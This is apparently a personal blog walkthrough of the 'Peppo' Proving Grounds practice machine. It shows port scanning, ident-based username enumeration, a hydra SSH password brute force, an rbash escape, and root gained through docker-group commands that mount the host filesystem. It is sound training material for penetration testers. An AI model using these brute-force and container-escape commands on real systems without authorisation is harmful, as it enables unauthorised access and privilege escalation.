---
layout: default
title : muzec - Peppo - Proving Ground Practice 
---


### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.125`

```
# Nmap 7.91 scan initiated Sun Nov 28 08:53:20 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v -Pn 192.168.141.60
Increasing send delay for 192.168.141.60 from 0 to 5 due to 11 out of 24 dropped probes since last increase.
Nmap scan report for 192.168.141.60
Host is up (0.29s latency).
Not shown: 65529 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
113/tcp   open   ident
5432/tcp  open   postgresql
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Nov 28 08:54:22 2021 -- 1 IP address (1 host up) scanned in 62.41 seconds
```

Smooth so much ports oh sorry i mean few ports hehehehe sweet now let use some default nmap script and service detection to get more information from the ports we have running.

`nmap -sC -sV -oA nmap/normal -p 22,113,5432,8080,10000 IP`

```
# Nmap 7.91 scan initiated Sun Nov 28 10:11:18 2021 as: nmap -sC -sV -oA nmap/normal -p 22,113,5432,8080,10000 -Pn 192.168.235.60
Nmap scan report for 192.168.235.60
Host is up (0.48s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
113/tcp   open  ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|_    RProcessStartupPacket
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
10000/tcp open  snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 28 Nov 2021 12:11:23 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 28 Nov 2021 12:11:25 GMT
|     Connection: close
|_    Hello World
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.91%I=7%D=11/28%Time=61A347C3%P=x86_64-pc-linux-gnu%r(S
SF:MBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronte
SF:nd\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x20
SF:3\.0\0Fpostmaster\.c\0L2071\0RProcessStartupPacket\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10000-TCP:V=7.91%I=7%D=11/28%Time=61A347C0%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\
SF:nDate:\x20Sun,\x2028\x20Nov\x202021\x2012:11:23\x20GMT\r\nConnection:\x
SF:20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x2
SF:0OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\x2028\x20Nov\x20202
SF:1\x2012:11:25\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%
SF:r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusReques
SF:tTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n
SF:\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 28 10:12:27 2021 -- 1 IP address (1 host up) scanned in 69.06 seconds

```

### NMAP

`By default (-sC) nmap will identify every user of every running port:`

```
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
113/tcp   open  ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|_    RProcessStartupPacket
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
10000/tcp open  snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
```

Which is `auth-owners:` with each users on the front cool right now let leave nmap alone and focus on the ports. Some pretty cool ports which is great i guess without wasting to much of time let jump and start the enumeration on each ports to see what we can get on each ones. SSH we need a credentials for that so we are starting with `ident` .

### IDENT 113

Ident Is an Internet protocol that helps identify the user of a particicular TCP connection one of the tools i will be using to enumerate ident is `Ident-user-enum`

Ident-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services. It can be installed with `apt install ident-user-enum`.


` ident-user-enum  192.168.202.60 22 113 5432 8080 10000`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/PG Practice/peppo]
└─$ ident-user-enum   192.168.141.60 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.141.60:22       root
192.168.141.60:113      nobody
192.168.141.60:5432     <unknown>
192.168.141.60:8080     <unknown>
192.168.141.60:10000    eleanor
```

Now that we have enumerate for users let trying using it to brute force for SSH and see if we can get access using `hydra` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/PG Practice/peppo]
└─$ hydra -l eleanor -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.90.60  
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-28 10:55:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ssh://192.168.90.60:22/
[22][ssh] host: 192.168.90.60   login: eleanor   password: eleanor
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-28 10:56:14
```

Boom we have credentials for SSH let use to access it.

![image](https://user-images.githubusercontent.com/69868171/143768823-dbb66021-7ce8-44b7-951f-4867ccc59685.png)

But when i try to cat any file i got an error changing directories also lead to the same issue seems we are stuck in an rbash shell.

![image](https://user-images.githubusercontent.com/69868171/143769013-53e28d12-c444-4f45-be46-0c0ecdc368ca.png)

Let try escaping it with some techniques i try `vi,python` dead end but since i can list directores so i decided to see what command can we run on the rbash shell with the PATH we are stuck on.

![image](https://user-images.githubusercontent.com/69868171/143769262-b88c8a45-cb37-498b-86f9-ebb17b6932c9.png)


Now that seems promising so let check `gtfobins` .

![image](https://user-images.githubusercontent.com/69868171/143769290-8dbaa4f0-62bf-4231-b76f-c162af936ece.png)

Now that is cool let run it.

![image](https://user-images.githubusercontent.com/69868171/143769329-5133cb9f-1ce8-4ea5-a603-b5d9d76cabd4.png)

Boom we break out but something is still missing the PATH let export some PATH.

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

![image](https://user-images.githubusercontent.com/69868171/143769419-22d3d463-098f-4839-a0ca-95b52a099e05.png)

Now that is more better and seems we docker in part of groups yes i think that is our way to root.

### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/143771118-095352fe-e931-43dc-8edb-d5d114b8ba7a.png)

Smooth it writable.

### Writable Docker Socket

The docker socket is typically located at `/var/run/docker.sock` and is only writable by `root` user and `docker` group. If for some reason you have write permissions over that socket you can escalate privileges.

The following commands can be used to escalate privileges:

```
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

It both for `ubuntu` and `debain` but since we are on debain we are trying debain command but man it was a dead end.

![image](https://user-images.githubusercontent.com/69868171/143771298-d674b83f-9132-4f9c-9361-4af9d4a66ea7.png)

Seems we need the docker package but seems we have no internet on the machine we are unable to escalate let find a way to do it around.

### Use Docker Web API From Socket Without Docker Package

If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with `curl` .

The following commands are a example to create a docker container that mount the root of the host system and use `socat` to execute commands into the new docker.

```
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
##[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
##{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

But man it a dead end also let try and list the docker images.

```
docker images
```

![image](https://user-images.githubusercontent.com/69868171/143771872-622a511f-7037-48aa-b8f3-7759cef4e023.png)

Let run our docker with redmine.

```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

![image](https://user-images.githubusercontent.com/69868171/143771949-66c3a757-282e-40d3-9f36-4519ed44641d.png)

Boom we are root done and dusted.

![image](https://user-images.githubusercontent.com/69868171/143772016-70133bb5-3614-41fd-92f7-04c02756e279.png)


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
